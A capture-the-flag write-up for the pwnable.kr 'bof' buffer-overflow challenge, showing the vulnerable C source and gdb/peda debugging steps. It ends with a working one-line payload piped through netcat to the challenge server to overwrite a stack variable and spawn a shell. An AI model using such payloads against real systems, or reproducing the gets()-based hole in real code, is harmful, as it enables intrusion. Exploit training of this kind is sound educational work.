# **bof**
First, we got the source code with .ELF file from the website.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```


![](https://i.imgur.com/my4Pb5O.png)
![](https://i.imgur.com/nhWAWPJ.png)

Cuz to bufferoverflow type's question, we should install a plugin to gdb, it may help a lot.

`git clone https://github.com/longld/peda.git ~/peda`

`echo "source ~/peda/peda.py" >> ~/.gdbinit`

![](https://i.imgur.com/0qX7YbU.png)

Then, change the .ELF you downloaded from the website by `chmod 777 bof`.(if your compiler settings is not the same to this question)

Starting trace code with `gdb ./bof`.

First, set a break point by `b main` to stop auto running.


![](https://i.imgur.com/I2W9xvB.png)

Insert `r` to start running the program.

![](https://i.imgur.com/6fiiiVa.png)

Using `n` which means "next" to line by line running this code.

![](https://i.imgur.com/B5qAK9B.png)

Using `s` which means "step" to step into the funtion, if you keep insert `n` then it will bypass this function's detail.

![](https://i.imgur.com/hgSsF18.png)

In this function which call by main, is calling IO.GET on line 35.

Before you step on it, you should create your own offset to determind the location of the overwritable point.

`pattern create 100` may help.
`100` is the value for nobody guess, but we sure that it should bigger than the distance from get point to `key` of `void func(int key)`.

You can also see the compare command just two more lines later. It means `key` are stored in `ebp+0x8`.

Before you overwrite it, the value of `ebp+0x8` must be `0xdeadbeef`.

![](https://i.imgur.com/6R4blpO.png)

After you step on it, it will require you to insert your offset. Just paste to the shell.

![](https://i.imgur.com/E9cZx5P.png)

After you paste your offset into this process, you can check what's storing in `ebp+0x8` now by `telescope $ebp+0x8 1`.

Now, you see `AAGAACAA` is the key offset we overwrite on `0xdeadbeef`.

![](https://i.imgur.com/cHUzfwN.png)

Using `pattern offset AAGA` to find the offset location.

After all, type `q` to exit the gdb.

![](https://i.imgur.com/fcmy8od.png)

Using python to generate the payload and inject it to server.

`(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; car -) | nc pwnable.kr 9000`

Becareful that stack is struct in DESC order, `cafebabe` should turn to be `bebafeca`.

![](https://i.imgur.com/0nGXESp.png)

Then, you'll get a shell return.

![](https://i.imgur.com/1qUJW6E.png)

You can check `id` and then `ls` it.

![](https://i.imgur.com/JUvQZ09.png)

Congratuz! `cat` the flag. Bada bing bada boom.

